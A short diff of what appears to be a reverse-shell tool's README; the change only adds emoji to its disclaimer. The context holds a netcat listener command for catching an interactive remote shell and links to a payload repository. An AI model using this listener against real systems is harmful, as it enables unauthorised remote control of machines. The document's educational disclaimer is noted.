@@ -18,7 +18,7 @@ command : ssty raw -echo; (stty size; cat) | nc -lvnp port -s IPaddr
 --https://www.youtube.com/watch?v=bXCeFPNWjsM
 --https://github.com/swisskyrepo/PayloadsAllTheThings
 
-# disclamer
+# 👀📍 disclamer
 please don't spread this as malware or use on othere's with out concent,
 this script was made for the pure pupose of education and cyber sucrity in mind.
 
